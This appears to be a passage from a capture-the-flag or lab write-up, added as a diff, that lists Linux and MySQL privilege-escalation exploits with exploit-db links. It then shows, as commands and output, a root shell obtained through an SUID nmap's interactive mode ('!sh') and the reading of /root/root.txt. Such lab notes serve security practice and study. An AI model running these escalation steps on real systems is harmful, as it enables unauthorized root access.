+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - < 2.6.36.2 Econet Privilege Escalation Exploit || http://www.exploit-db.com/exploits/17787 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby
+    - < 2.6.37-rc2 ACPI custom_method Privilege Escalation || http://www.exploit-db.com/exploits/15774 || Language=c
+    - 'pipe.c' Local Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/10018 || Language=sh
+    - 2.4/2.6 sock_sendpage() Local Root Exploit [3] || http://www.exploit-db.com/exploits/9641 || Language=c
+    - <= 2.6.37 Local Privilege Escalation || http://www.exploit-db.com/exploits/15704 || Language=c
+    - 2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/895 || Language=c
+
+
+
+NMAP LISTED AS A SUID EXECUTABLE IN LINUX PRIV CHECK SCRIPT
+
+[+] Related Shell Escape Sequences...
+
+    nmap-->	--interactive
+
+ls -l /usr/bin/nmap
+-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
+nmap -V
+
+Nmap version 4.53 ( http://insecure.org )
+nmap --interactive
+
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+
+whoami
+root
+id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+
+GET ROOT.TXT
+cat /root/root.txt
+####################
+
+
+
